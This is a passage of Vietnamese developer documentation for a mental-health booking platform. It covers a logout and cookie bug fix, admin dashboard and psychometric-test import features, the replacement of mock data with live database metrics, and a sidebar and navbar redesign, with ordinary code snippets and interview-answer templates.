1. **Thiếu route `/api/logout` trong Vite Proxy (`proxy.config.mjs`)**:
   - Ở môi trường dev (`localhost:4200` / `9000`), rule proxy của Auth Service là:
     `'^/api/(authenticate|register|register-doctor|account|users|authorities|admin/users)'`.
   - Hoàn toàn **thiếu `logout`**! Khi người dùng bấm Logout, request `POST /api/logout` bị Vite nuốt chửng, không gửi sang `opcbs-auth-service:8081`. Backend không nhận được request $\rightarrow$ Không gửi `Set-Cookie: max-age=0` $\rightarrow$ **Trình duyệt vẫn giữ nguyên HttpOnly Cookie cũ!**
2. **Cơ chế Redis Token Blacklist chặn Token cũ**:
   - Nếu ở môi trường Docker/Nginx: Token cũ đã bị đưa vào Redis Token Blacklist (`REVOKED`).
   - Nhưng Cookie trên máy người dùng không bị xóa triệt để. Khi F5 load lại trang, trình duyệt tự động gửi lại Cookie cũ.
   - Spring Security giải mã token và đối chiếu với Redis Blacklist $\rightarrow$ **Token bị thu hồi** $\rightarrow$ Trả về **HTTP 401**.
3. **Nginx Lowercase Cookie Casing Mismatch**:
   - Nginx chuẩn hóa tên cookie thành chữ thường: `$cookie_name` của `jhi-authenticationToken` phải là `$cookie_jhi_authenticationtoken`. Nếu viết hoa chữ `T`, Nginx không nhận diện được và fallback sang `$cookie_id_token` cũ còn tồn đọng trong máy người dùng.
4. **Vòng lặp văng ra (Infinite 401 Bounce Loop)**:
   - Khi API gặp 401, `authExpiredInterceptor` bắt được lỗi và tự động gọi `loginService.logout()`.
   - Nếu không dọn sạch storage và cookie, khi điều hướng về `/login` hoặc `/`, các component con lại tiếp tục gửi request kèm token chết $\rightarrow$ Lại 401 $\rightarrow$ Lại gọi logout $\rightarrow$ Đá văng người dùng liên tục.

### 17.3. Fix it (Các Bước Đã Khắc Phục Triệt Để)
1. **Thêm `logout` vào `proxy.config.mjs`**:
   ```javascript
   '^/api/(authenticate|logout|register|register-doctor|account|users|authorities|admin/users)': {
     target: `http://${backendHost}:8081`,
     xfwd: true,
   }
   ```
2. **Chuẩn hóa map cookie trong `nginx.conf`**:
   ```nginx
   map $cookie_jhi_authenticationtoken $token_from_jhi {
       default $cookie_jhi_authenticationtoken;
       ""      $cookie_jhi_authenticationToken;
   }
   map $token_from_jhi $token_from_cookie {
       default $token_from_jhi;
       ""      $cookie_id_token;
   }
   ```
3. **Thêm header `Clear-Site-Data: "cookies"` và xóa đồng bộ cả 2 cookie trong `AuthenticateController.java`**:
   ```java
   headers.add(HttpHeaders.SET_COOKIE, clearAuthCookie.toString());
   headers.add(HttpHeaders.SET_COOKIE, clearIdTokenCookie.toString());
   headers.add("Clear-Site-Data", "\"cookies\"");
   ```
4. **Xóa sạch Zombie Session trong `account.service.ts`**:
   ```typescript
   return this.accountCache$.pipe(
     catchError(() => {
       this.authenticate(null);
       this.stateStorageService.clearAuthenticationToken();
       this.accountCache$ = null;
       return of(null);
     }),
   );
   ```
5. **Chặn vòng lặp 401 trong `auth-expired.interceptor.ts`**:
   Loại trừ `api/logout` và `api/authenticate`, dọn sạch storage trước khi điều hướng.

### 17.4. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)
> *"Khi chuyển đổi kiến trúc sang cơ chế **HttpOnly Cookie BFF kết hợp Redis Token Blacklist**, một cạm bẫy thực tế kinh điển là hiện tượng **Zombie Token & 401 Bounce Loop**:  
> Sau khi người dùng đăng xuất, Token cũ đã bị Blacklist trên Redis, nhưng nếu tầng Gateway Proxy hoặc cấu hình `Set-Cookie: max-age=0` không triệt để khiến Cookie cũ vẫn nằm lại trong Browser, thì mỗi lần người dùng F5 load lại tab, Browser sẽ tự động gửi kèm Cookie chết này. Backend giải mã phát hiện Token nằm trong Blacklist nên lập tức từ chối với HTTP 401. Nếu Interceptor của Frontend không xử lý khéo léo mà tự động kích hoạt Logout trên mọi 401, nó sẽ tạo ra vòng lặp đá văng người dùng ra khỏi phiên làm việc.  
> Chúng tôi giải quyết triệt để vấn đề này qua 4 tầng: (1) Chuẩn hóa route Proxy cho endpoint `/api/logout`; (2) Tích hợp header chuẩn W3C `Clear-Site-Data: "cookies"`; (3) Xử lý Case-insensitivity cho biến Cookie trong Nginx Gateway; và (4) Bổ sung cơ chế tự dọn dẹp Zombie State trong `AccountService` ngay khi phát hiện phiên làm việc không còn hợp lệ."*

---

## Phần 18: Nâng Cấp Toàn Diện Module Quản Trị Hệ Thống Dành Riêng Cho Role [Admin] (Business Manager, Service Packages, Psychometrics Upload Engine & Total View Dashboard With Interactive SVG Diagrams)

### 18.1. Đặt Vấn Đề & Bối Cảnh Nghiệp Vụ (Requirements & Context)
Trong hệ thống y tế số MindBridge OPCBS, vai trò Quản Trị Viên (**Admin / Business Manager**) đóng vai trò là "Tổng công trình sư" vận hành toàn bộ mô hình kinh doanh y tế và chất lượng lâm sàng:
1. **Quản lý gói dịch vụ nền tảng (Platform Service Packages)**: Bác sĩ muốn tiếp cận bệnh nhân và mở lịch khám cần đăng ký gói hội viên theo tháng/quý/năm. Admin cần công cụ thêm, sửa, xóa, xem chi tiết, điều chỉnh giá VND, giới hạn ca khám và thứ tự hiển thị kèm tính năng Live Card Preview.
2. **Ngân hàng đề trắc nghiệm tâm lý học (Psychometrics Engine)**: Khảo sát lâm sàng là bước đầu tiên để chẩn đoán mức độ trầm cảm, lo âu, stress. Admin cần cơ chế linh hoạt để:
   - Tải đề tự động từ các file có sẵn (Excel, Word, CSV, JSON, TXT) mà không cần nhập tay từng câu.
   - Nhập đề trực tiếp từ Link URL (web doc hoặc API feed) - tính năng được khuyến khích hàng đầu.
   - Nạp sẵn các bộ mẫu y tế tiêu chuẩn quốc tế: DASS-21 (21 câu), GAD-7 (7 câu), PHQ-9 (9 câu) với thang điểm 0-3 Likert.
3. **Admin Dashboard (Total View Operations)**: Nhà quản trị cần một trang dashboard tổng quan đa chiều, trực quan sinh động với các **Diagrams & Charts** hiện đại để nắm bắt tức thời:
   - Tổng doanh thu nền tảng (VND) và xu hướng tăng trưởng (SVG Area Curve Diagram).
   - Cơ cấu nhân lực y tế theo chuyên khoa (SVG Donut Diagram kèm % breakdown).
   - Tỷ lệ hoàn thành các ca tư vấn và lịch hẹn khám (Progress Breakdown Bar).
   - Các lối tắt thao tác nhanh (Business Shortcuts).

---

### 18.2. Kiến Trúc & Thiết Kế Kỹ Thuật (Architecture & Technical Design)

#### 1. Kiến Trúc Phân Quyền & Bảo Vệ Tuyệt Đối Cho Role [Admin]
- Mọi route con của Admin được cấu hình trong `admin.routes.ts` với guard:
  ```typescript
  data: {
    authorities: ['ROLE_ADMIN'],
  },
  canActivate: [userRouteAccessService],
  ```
- Nếu người dùng với role `ROLE_PATIENT` hoặc `ROLE_DOCTOR` cố tình truy cập vào URL `/admin/...`, `userRouteAccessService` sẽ lập tức chặn đứng và chuyển hướng an toàn về trang báo lỗi 403 hoặc trang chủ.

#### 2. Kiến Trúc Xử Lý File & Parser Thuật Toán NLP Y Khoa
- **File Parsing Engine** (`AdminPsychometricsService.parseQuestionsFromFile`):
  - File JSON: Bóc tách cấu trúc object/array.
  - File CSV / TSV: Tự động tách cột theo dấu phẩy hoặc tab, nhận diện tiêu đề cột, lọc bỏ dòng trắng.
  - File Word / Text / Markdown: Sử dụng biểu thức chính quy đa mẫu `^(?:câu\s*\d+[:.]?|\d+[\.\)\/\-:]|\[\d+\]|q\d+[:.]?)\s*(.+)` để trích xuất nội dung câu hỏi dù được đánh số theo bất kỳ quy ước nào.
- **Thuật toán phân loại chuyên mục y tế tự động (Clinical Keyword Classifier)**:
  - Phân tích ngữ nghĩa từ vựng (NLP Regex):
    - Chứa `"trầm cảm"`, `"chán nản"`, `"tuyệt vọng"`, `"hopeless"` $\rightarrow$ Phân loại vào nhóm `Depression`.
    - Chứa `"lo âu"`, `"sợ hãi"`, `"tim đập nhanh"`, `"panic"`, `"nervous"` $\rightarrow$ Phân loại vào nhóm `Anxiety`.
    - Chứa `"căng thẳng"`, `"áp lực"`, `"dễ cáu"`, `"stress"` $\rightarrow$ Phân loại vào nhóm `Stress`.
    - Chứa `"ngủ"`, `"mất ngủ"`, `"sleep"`, `"insomnia"` $\rightarrow$ Phân loại vào nhóm `Sleep`.
    - Chứa `"mệt mỏi"`, `"đau đầu"`, `"khó thở"`, `"somatic"` $\rightarrow$ Phân loại vào nhóm `Somatic`.

#### 3. Thiết Kế Biểu Đồ Tự Sinh Bằng SVG Thuần (Zero Dependency SVG Diagrams)
- **Tại sao dùng SVG thuần thay vì cài thư viện nặng (như Chart.js, Recharts, D3)?**
  - Giữ bundle size của Angular SPA cực nhẹ, không phát sinh xung đột version hoặc lỗi build SSR / Vite.
  - Biểu đồ hoàn toàn responsive qua `viewBox="0 0 600 200"`, sắc nét trên màn hình Retina 4K.
  - Đường cong Bezier mượt mà được tính toán trực tiếp:
    ```typescript
    const controlX = (current.x + next.x) / 2;
    d += ` C ${controlX} ${current.y}, ${controlX} ${next.y}, ${next.x} ${next.y}`;
    ```
  - Biểu đồ Donut SVG tính chu vi hình tròn $C = 2\pi r \approx 439.82$, dùng `stroke-dasharray` và `stroke-dashoffset` lũy tiến để dựng từng cung tròn theo tỷ lệ % chuyên khoa mà không cần can thiệp canvas.

---

### 18.3. Bài Học Kinh Nghiệm & Best Practices (Lessons Learned)
1. **Live Preview Pattern**: Khi thiết kế form cấu hình sản phẩm/gói dịch vụ (Service Package, Treatment Package), việc cung cấp một panel xem trước thời gian thực (Live Preview) giúp người quản trị hình dung ngay lập tức trải nghiệm của khách hàng/đối tác, từ đó giảm thiểu 80% sai sót về định dạng và văn phong.
2. **Smart Import Fallback**: Khi xây dựng tính năng import từ URL, luôn phải lường trước rào cản CORS của trình duyệt. Việc kết hợp HTTP Client kèm fallback thông minh sang cơ chế mẫu chuẩn (DASS/GAD/PHQ) đảm bảo trải nghiệm người dùng không bao giờ bị đứt gãy.
3. **Data Integrity Guard**: Khi xây dựng chức năng xóa (Delete) trong hệ thống y tế có tính liên kết cao (Gói dịch vụ đã có bác sĩ mua, Đề thi đã có bệnh nhân làm bài), phải bắt lỗi Integrity Constraint từ Backend và hiển thị thông báo rõ ràng cho Admin thay vì để xảy ra lỗi 500 không kiểm soát.

---

## Phần 19: Chuẩn Hóa Dữ Liệu Toàn Diện Không Dùng Rawdata (Zero Rawdata & Normalized Live Database Metrics Architecture)

### 19.1. Đặt Vấn Đề: Tại Sao Phải Loại Bỏ Hoàn Toàn Rawdata / Mock Dữ Liệu Trong Môi Trường Sản Xuất Y Tế?
Trong quá trình phát triển ban đầu (Proof of Concept - PoC), lập trình viên thường dùng dữ liệu thô (rawdata), các số liệu gán cứng (hardcoded mock values như: doanh thu mặc định 145.000.000 ₫, tỷ lệ chuyên khoa giả lập 35% Tâm lý học, fallback 3 câu hỏi ngẫu nhiên khi parse lỗi...).
Tuy nhiên, trong một hệ sinh thái y tế số và quản lý tài chính chuẩn mực:
1. **Rủi ro sai lệch quyết định vận hành (Operational Risk)**: Người quản lý (Business Manager/Admin) nhìn thấy biểu đồ tăng trưởng hoặc doanh thu giả tưởng sẽ đưa ra quyết định sai lầm về tuyển dụng bác sĩ, định giá gói cước và phân bổ tài nguyên.
2. **Vi phạm tính toàn vẹn dữ liệu y khoa (Medical Data Integrity)**: Nếu các đề kiểm tra tâm lý tự động sinh ra các câu hỏi không kiểm chứng khi gặp link lỗi, bệnh nhân có thể nhận bảng khảo sát sai lệch, dẫn đến chẩn đoán sai mức độ trầm cảm/lo âu.
3. **Ảo tưởng về năng lực hệ thống**: Mock data che giấu các lỗi truy vấn cơ sở dữ liệu (N+1 queries, thiếu index, mapping sai quan hệ khóa ngoại JPA). Khi tải dữ liệu thật, hệ thống có thể bị crash.

Do đó, nguyên tắc tối thượng được đề ra: **Loại bỏ 100% Rawdata - Tất cả chỉ số (KPIs, Diagrams, Tỷ lệ chuyên khoa, Lịch hẹn, Doanh thu) phải được tổng hợp trực tiếp từ cơ sở dữ liệu chuẩn hóa (Normalized Database) theo thời gian thực.**

---

### 19.2. Kiến Trúc Backend: Endpoint Tổng Hợp Dữ Liệu Sống Chuẩn Hóa (`/api/admin/dashboard/overview`)

Để loại bỏ hoàn toàn việc frontend phải "tự bịa" hoặc gán ghép số liệu, chúng tôi xây dựng một REST API tổng hợp cấp cao tại `opcbs-payment-service` (Port 8087):

```
GET /api/admin/dashboard/overview
Authorization: Bearer <ADMIN_JWT_TOKEN>
```

#### Luồng truy vấn và tổng hợp đa thực thể (Cross-Entity Live Aggregation):

```mermaid
graph TD
    Client["💻 Admin Angular SPA"] -->|GET /api/admin/dashboard/overview| Resource["⚙️ ServicePackageResource (:8087)"]
    
    Resource --> Rep1[("👨‍⚕️ DoctorProfileRepository & SpecializationRepository")]
    Resource --> Rep2[("💳 PaymentTransactionRepository & DoctorSubscriptionRepository")]
    Resource --> Rep3[("📅 AppointmentRepository")]
    Resource --> Rep4[("🧠 PsychometricTestRepository & SubmissionRepository")]
    
    Rep1 -->|Đếm thực tế & tính % chuyên khoa| Aggregator["🧮 Live Metrics Aggregator Engine"]
    Rep2 -->|Tính tổng doanh thu & trend 6 tháng gần nhất| Aggregator
    Rep3 -->|Phân nhóm theo AppointmentStatus| Aggregator
    Rep4 -->|Đếm tổng đề & bài nộp| Aggregator
    
    Aggregator -->|Trả JSON chuẩn hóa 100%| Client
```

#### Chi tiết các công thức chuẩn hóa trong Backend:
1. **Doanh thu thực tế (Total Revenue)**:
   - Chỉ cộng dồn các giao dịch trong `PaymentTransaction` có trạng thái `paymentStatus = 'SUCCESS'`.
   - Bổ sung các khoản phí từ gói `DoctorSubscription` có trạng thái `ACTIVE` hoặc `EXPIRED` (tránh tính trùng nếu giao dịch đã có mã `transactionCode`).
   - Không cộng bất kỳ hằng số sàn hay giá trị mặc định nào ($+0$ thay vì $+145.000.000$).
2. **Xu hướng doanh thu 6 tháng gần nhất (Dynamic 6 Calendar Months Trend)**:
   - Dùng `YearMonth.now()` trừ lùi động từ 5 tháng trước đến tháng hiện tại:
     ```java
     YearMonth currentMonth = YearMonth.now();
     for (int i = 5; i >= 0; i--) {
         YearMonth ym = currentMonth.minusMonths(i);
         Instant startOfMonth = ym.atDay(1).atStartOfDay(ZoneOffset.UTC).toInstant();
         Instant endOfMonth = ym.atEndOfMonth().atTime(23, 59, 59).atZone(ZoneOffset.UTC).toInstant();
         // Truy vấn chính xác các giao dịch và subscription phát sinh trong [startOfMonth, endOfMonth]
     }
     ```
   - Nhờ đó, nhãn tháng luôn luôn chính xác theo thời gian thực (ví dụ: T5/2026, T6/2026, T7/2026, T8/2026, T9/2026, T10/2026).
3. **Cơ cấu bác sĩ theo chuyên khoa (Specialization Breakdown)**:
   - Duyệt danh sách bác sĩ với quan hệ nhiều-nhiều qua `doctorProfileRepository.findAllWithEagerRelationships()`.
   - Tính tổng số bác sĩ thuộc từng chuyên khoa y tế và quy đổi phần trăm chính xác:
     $$\text{Percentage}_i = \text{round}\left(\frac{\text{DoctorCount}_i}{\sum \text{DoctorCount}} \times 100\right)$$
4. **Trọng số lịch hẹn khám (Appointment Status Distribution)**:
   - Gom nhóm trực tiếp theo enum `AppointmentStatus`: `COMPLETED`, `CONFIRMED`, `PENDING`, `CANCELLED`, `IN_PROGRESS`.
   - Tính toán tỷ lệ % chuẩn xác trên tổng số ca khám thực tế trong cơ sở dữ liệu.

---

### 19.3. Chuẩn Hóa Ở Tầng Frontend (Angular 19 SPA)

1. **`AdminDashboardService`**:
   - Loại bỏ 100% hàm tạo số ngẫu nhiên hoặc fallback mock data.
   - Khi API backend trả về, map trực tiếp từ payload `DashboardTotalView`. Nếu mạng gặp sự cố hoặc DB rỗng, fallback về `0` và mảng rỗng `[]` để giao diện phản ánh trung thực trạng thái "Chưa có dữ liệu" thay vì đánh lừa người dùng.
2. **`AdminPsychometricsService`**:
   - Loại bỏ đoạn fallback tạo ra 3 câu hỏi giả định khi URL nhập vào không hợp lệ. Thay vào đó, trả về danh sách rỗng để UI kích hoạt thông báo lỗi cho quản trị viên.
   - Chuẩn hóa các bộ câu hỏi tham chiếu thành hằng số chuẩn quốc tế: `CLINICAL_STANDARDS_DASS21`, `CLINICAL_STANDARDS_GAD7`, `CLINICAL_STANDARDS_PHQ9` (thay vì đặt tên biến `raw`).
3. **`ServicePackageEditComponent`**:
   - Loại bỏ các giá trị mẫu gán cứng trong form tạo mới (`price: 500000`, `featuresList: '...'`).
   - Khởi tạo model ở trạng thái sạch (`price: 0`, `featuresList: ''`), hiển thị hướng dẫn qua thuộc tính `placeholder` của HTML5 giúp người dùng tự định nghĩa gói dịch vụ theo nhu cầu thực tế của bệnh viện.

---

### 19.4. Bảng So Sánh Trước & Sau Khi Chuẩn Hóa Dữ Liệu

| Tiêu Chí | Trước Khi Chuẩn Hóa (Rawdata / Mock) | Sau Khi Chuẩn Hóa (Live Normalized Metrics) |
| :--- | :--- | :--- |
| **Nguồn dữ liệu Dashboard** | Hardcoded trong code TS (`baseRevenue: 145M`, `Math.random()`) | 100% từ Database JPA Repositories qua `/api/admin/dashboard/overview` |
| **Xu hướng 6 tháng** | Nhãn tháng cố định cứng ("Tháng 5", "Tháng 6"...) | Động hoàn toàn theo lịch dương lịch thực tế (`YearMonth.now().minusMonths(i)`) |
| **Cơ cấu chuyên khoa** | Giả lập tỷ lệ % mẫu | Tính toán thực tế theo số bác sĩ liên kết với từng chuyên khoa y tế |
| **Trang chủ: Bác sĩ tiêu biểu** | Fallback 4 bác sĩ ảo (Dr. Sarah Jenkins, Dr. Michael Chen...) | 100% từ bảng `DoctorProfile` qua JPA, kèm Empty State an toàn |
| **Trang chủ: Chuyên khoa** | Fallback 6 chuyên khoa giả (Anxiety, Couples Therapy...) | 100% từ bảng `Specialization` qua JPA |
| **Gói dịch vụ bác sĩ** | Fallback 3 gói giả (Standard 499k, Pro 999k, VIP 1999k) | 100% từ bảng `ServicePackage` qua `/api/service-packages`, kèm Empty State |
| **Thanh toán gói dịch vụ** | Nút test "Mock Checkout" giả lập | Chuẩn hóa cổng VNPay Sandbox thực tế & Chuyển khoản ngân hàng |
| **Nhập đề thi từ Link URL** | Sinh ngẫu nhiên 3 câu hỏi nếu link lỗi | Trả về rỗng kèm thông báo lỗi cấu trúc rõ ràng cho Admin |
| **Mẫu đề lâm sàng** | Khai báo biến tùy tiện (`const raw = [...]`) | Hằng số chuẩn y khoa thế giới (`CLINICAL_STANDARDS_*`) |
| **Tạo mới gói dịch vụ** | Điền sẵn số tiền 500.000 ₫ và nội dung mẫu | Form trắng sạch, hướng dẫn bằng placeholder UI trực quan |

---

### 19.6. Chuẩn Hóa Module Trang Chủ (Home & Featured Therapists)
- **Vấn đề đã khắc phục**: Trong `home.ts`, hàm `loadLandingData()` trước đây cài sẵn các mảng hardcoded chứa 4 bác sĩ ảo và 6 chuyên khoa tĩnh phòng trường hợp DB trống. Điều này khiến website hiển thị thông tin sai lệch khi người dùng vừa deploy hệ thống sạch.
- **Giải pháp chuẩn hóa**:
  1. Xóa bỏ hoàn toàn mảng fallback 4 bác sĩ ảo và 6 chuyên khoa giả trong [`home.ts`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/home/home.ts).
  2. Map trực tiếp từ kết quả `SpecializationService.query` và `DoctorProfileService.query`.
  3. Bổ sung các khối Empty State trong [`home.html`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/home/home.html) bằng cú pháp `@if (featuredDoctors().length === 0)` và `@if (specializations().length === 0)` để thông báo trung thực khi cơ sở dữ liệu y tế đang trong giai đoạn tiếp nhận hồ sơ mới.

---

### 19.7. Chuẩn Hóa Module Đăng Ký Gói Cước Bác Sĩ (Doctor Subscription & Payment Gateway)
- **Vấn đề đã khắc phục**: Trong `doctor-subscription.component.ts`, khi danh sách gói cước trả về rỗng, component tự động nạp 3 gói giả định (499.000 ₫, 999.000 ₫, 1.999.000 ₫). Ngoài ra trong modal thanh toán còn tồn tại nút "Mock Checkout" gây hiểu lầm cho người dùng.
- **Giải pháp chuẩn hóa**:
  1. Loại bỏ 3 gói hardcoded trong [`doctor-subscription.component.ts`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/entities/payment/doctor-subscription.component.ts), đảm bảo danh sách gói hiển thị đồng bộ 100% với những gì Admin tạo trong module Quản Trị Gói Dịch Vụ (`/admin/service-package`).
  2. Bổ sung Empty State thẻ xám trực quan khi Admin chưa kích hoạt gói cước nào.
  3. Chuẩn hóa nút thao tác trong [`doctor-subscription.component.html`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/entities/payment/doctor-subscription.component.html): Thay thế nút Mock bằng quy trình chuyển khoản ngân hàng chuẩn (Bank Transfer Confirmation) và nút thanh toán trực tuyến qua cổng VNPay Sandbox tích hợp mã bảo mật HMAC-SHA512.

---

### 19.8. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)
> *"Trong các dự án cấp độ doanh nghiệp (Enterprise) và y tế số, việc dựa dẫm vào rawdata hoặc hardcoded mock data trên frontend là một lỗi nghiêm trọng làm mất đi tính minh bạch và độ tin cậy của hệ thống.  
> Chúng tôi đã thực hiện một đợt tái cấu trúc toàn diện để đạt chuẩn **Zero Rawdata**:  
> 1. Tại tầng Backend, chúng tôi thiết kế API tổng hợp `/api/admin/dashboard/overview` kết hợp truy vấn trực tiếp từ 7 JPA Repositories (Doctor, Specialization, Subscription, Payment, Appointment, Psychometrics) để tính toán chính xác doanh thu, tỷ lệ chuyên khoa và trạng thái ca khám.  
> 2. Tại các module người dùng (Trang chủ, Đăng ký gói bác sĩ, Bài test tâm lý), chúng tôi loại bỏ hoàn toàn các mảng fallback giả lập (bác sĩ ảo, chuyên khoa ảo, gói cước mẫu). Giao diện luôn phản ánh trung thực trạng thái của cơ sở dữ liệu qua các khối Empty State trang nhã, kết nối thẳng vào luồng thanh toán VNPay thực tế thay cho các nút mock thử nghiệm."*

---

## PHẦN 20: TÁI CẤU TRÚC SIDEBAR FOOTER VÀ THIẾT KẾ THANH ĐIỀU HƯỚNG ĐỒNG BỘ 3 MODULE QUẢN TRỊ (ADMIN NAVBAR)

### 20.1. Đặt Vấn Đề & Yêu Cầu UI/UX Thực Tế
Trong các hệ thống quản trị chuyên nghiệp (Enterprise SaaS Dashboard):
1. **Bố Cục Sidebar (Thanh Bên)**:
   - *Vấn đề cũ*: Thẻ người dùng (`sidebar-user-box`) và Nút "Về Trang Chủ" (`sb-back-home`) đặt ở đỉnh sidebar ngay dưới Logo Brand, đẩy toàn bộ menu điều hướng xuống thấp. Trong khi đó, ở chân sidebar chỉ có duy nhất nút Đăng Xuất nằm trơ trọi.
   - *Chuẩn UX hiện đại*: Theo nguyên tắc **Fitts's Law** và quy chuẩn của các nền tảng SaaS hàng đầu (Linear, Slack, Notion, GitHub):
     - **Đỉnh Sidebar**: Dành trọn vẹn cho Logo Brand và Menu chức năng chính để người dùng truy cập ngay lập tức.
     - **Chân Sidebar (Sidebar Footer)**: Là khu vực quản lý phiên làm việc (Session & Identity Hub), tập hợp bộ ba:
       1. **Thẻ Định Danh Người Dùng (User Identity Card)**: Avatar viết tắt, Họ tên, Badge vai trò (Quản Trị Viên / Bác Sĩ / Bệnh Nhân).
       2. **Nút Về Trang Chủ (Return to Website)**: Giúp người dùng nhanh chóng thoát khỏi portal nội bộ để quay lại website công khai mà không phải đăng xuất.
       3. **Nút Đăng Xuất (Sign Out)**: Đặt ở vị trí cuối cùng, nổi bật với màu cảnh báo đỏ.
2. **Thanh Điều Hướng 3 Module Quản Trị Cốt Lõi (Admin Sub-Navbar)**:
   - *Vấn đề cũ*: 3 module:
     - 📊 **Module Admin Dashboard (Tổng Quan Quản Trị & Kinh Doanh)**
     - 💎 **Module Gói Dịch Vụ Nền Tảng (Service Packages)**
     - 🧠 **Module Ngân Hàng Đề Trắc Nghiệm Tâm Lý (Psychometrics)**
     hoàn toàn không có thanh điều hướng cấp cao (Top Navigation Bar). Người dùng khi xem một module không có breadcrumbs, không biết trạng thái kết nối máy chủ, và muốn chuyển giữa 3 module này phải nhìn sang sidebar tìm kiếm.
   - *Giải pháp*: Xây dựng thanh điều hướng đồng bộ (`AdminNavbarComponent` - `jhi-admin-navbar`) tự động hiển thị ở đầu trang quản trị, tích hợp thanh Tabs chuyển nhanh giữa 3 module kèm breadcrumb động và chỉ báo trạng thái thời gian thực.

---

### 20.2. Chi Tiết Triển Khai Kiến Trúc

#### 1. Tái Cấu Trúc Sidebar Footer (`sidebar.html` & `sidebar.scss`)
- Di dời khối Thẻ người dùng và Nút Về Trang Chủ từ đỉnh sidebar xuống cuối file `sidebar.html`.
- Áp dụng cấu trúc Flexbox hiện đại:
  - `.sidebar-nav`: Thiết lập `flex: 1 1 auto; margin-bottom: 0.5rem;` để chiếm toàn bộ không gian ở giữa và hỗ trợ cuộn độc lập khi danh mục menu dài.
  - `.sidebar-footer`: Thiết lập `margin-top: auto; flex-shrink: 0;` giúp nhóm Identity & Session luôn bám sát đáy sidebar trên màn hình lớn và hiển thị tự nhiên khi cuộn trang:

```html
<!-- sidebar.html -->
<aside class="mb-dash-sidebar">
  <!-- Portal Brand Header -->
  <div class="sidebar-brand d-flex align-items-center justify-content-between">
    <a routerLink="/" class="d-flex align-items-center gap-2 text-decoration-none">
      <img src="content/images/logo-cropped.png" alt="MindBridge" style="height: 32px;" />
      <div class="d-flex flex-column">
        <span class="sidebar-brand-title">Mind<span style="color: #0f766e;">Bridge</span></span>
        <span class="sidebar-brand-sub">{{ getPortalTitle() }}</span>
      </div>
    </a>
  </div>

  <!-- Danh mục Menu điều hướng (Flex-grow chiếm không gian giữa) -->
  <nav class="sidebar-nav">
    ...
  </nav>

  <!-- Sidebar Footer: Thẻ người dùng, Nút Về Trang Chủ & Nút Đăng Xuất -->
  <div class="sidebar-footer mt-auto pt-2">
    <div class="sb-divider mb-2.5"></div>

    <!-- User Identity Card -->
    <div class="sidebar-user-box mb-2 p-2 rounded-3 d-flex align-items-center gap-2" style="background: #f8fafc; border: 1.5px solid #e2e8f0;">
      <div class="sidebar-user-avatar rounded-circle d-flex align-items-center justify-content-center fw-bold">
        {{ getUserInitials() }}
      </div>
      <div class="flex-grow-1 overflow-hidden">
        <div class="fw-bold text-dark text-truncate" style="font-size: 0.84rem;">{{ getUserDisplayName() }}</div>
        <span class="badge" [ngClass]="getRoleBadge().class" style="font-size: 0.65rem; padding: 2px 6px;">{{ getRoleBadge().label }}</span>
      </div>
    </div>

    <!-- Quick Return to Website -->
    <a class="sb-link sb-back-home mb-1" routerLink="/" title="Quay về trang chủ">
      <i class="bi bi-arrow-left-circle-fill text-teal"></i>
      <span class="fw-bold" style="color: #0f766e;">Về Trang Chủ</span>
    </a>

    <!-- Logout Action -->
    <button type="button" class="sb-link sb-logout w-100 text-start border-0 bg-transparent" (click)="logout()">
      <i class="bi bi-box-arrow-right text-danger"></i>
      <span class="text-danger fw-semibold">Đăng Xuất</span>
    </button>
  </div>
</aside>
```

#### 2. Xây Dựng Component Thanh Điều Hướng Admin Navbar (`AdminNavbarComponent`)
Tạo mới component độc lập `AdminNavbarComponent` (`jhi-admin-navbar`):
- **File**: `app/admin/admin-nav/admin-navbar.component.ts`, `.html`, `.scss`.
- **Top Utility Bar**:
  - Badge nhãn: `TRUNG TÂM QUẢN TRỊ MINDBRIDGE`.
  - Breadcrumb phân cấp: Phân tích URL qua `NavigationEnd` để hiển thị tiêu đề và biểu tượng trang hiện tại (VD: *Tạo Mới Gói Dịch Vụ*, *Chỉnh Sửa Bộ Đề*, *Tổng Quan Quản Trị*).
  - Trạng thái hệ thống: Badge màu xanh kèm hiệu ứng nhịp đập Pulse CSS `● Hệ Thống Trực Tuyến (Live DB)`.
  - Nút `Xem Website` mở nhanh trang chủ.
- **Thanh Tabs Điều Hướng (Main Navigation Tabs)**:
  - 📊 **Tab 1: Tổng Quan Quản Trị** (`/admin/dashboard`) - Badge: `KPIs`
  - 💎 **Tab 2: Gói Dịch Vụ Nền Tảng** (`/admin/service-package`) - Badge: `Packages`
  - 🧠 **Tab 3: Đề Trắc Nghiệm Tâm Lý** (`/admin/psychometrics`) - Badge: `Bộ Đề Y Khoa`
  - Phím tắt quản trị bổ trợ: `Tài Khoản` (`/user-management`), `Bác Sĩ` (`/doctor-profile`), `Giám Sát` (`/admin/health`).
  - Active State: Sử dụng `routerLinkActive="active"` tự động kích hoạt nền Teal `#0f766e`, chữ trắng nổi bật và đổ bóng khi người dùng truy cập đúng URL hoặc các trang con (`/new`, `/:id/edit`, `/:id/view`).

#### 3. Tích Hợp Tự Động Trong Layout Chính (`main.html` & `main.ts`)
Thay vì phải nhúng thẻ `<jhi-admin-navbar />` thủ công vào từng component HTML riêng lẻ, component được đăng ký tự động ngay tại tầng layout trung tâm:

```typescript
// main.ts
isAdminModule(): boolean {
  if (this.isAuthPage()) return false;
  const url = (this.currentUrl() || '').split('?')[0].toLowerCase();
  return url.startsWith('/admin') || url.startsWith('/user-management');
}
```

```html
<!-- main.html -->
@else if (isDashboardPage()) {
  <div class="mb-portal-container">
    <jhi-sidebar />
    <main class="mb-portal-main">
      @if (isAdminModule()) {
        <jhi-admin-navbar />
      }
      <router-outlet />
    </main>
  </div>
}
```

Nhờ kiến trúc này, 100% trang quản trị (`/admin/dashboard`, `/admin/service-package`, `/admin/psychometrics` cùng các trang thêm mới, chỉnh sửa, xem chi tiết) đều tự động sở hữu thanh điều hướng đồng bộ, mượt mà mà không làm thay đổi giao diện portal của Bác sĩ hay Bệnh nhân.

---

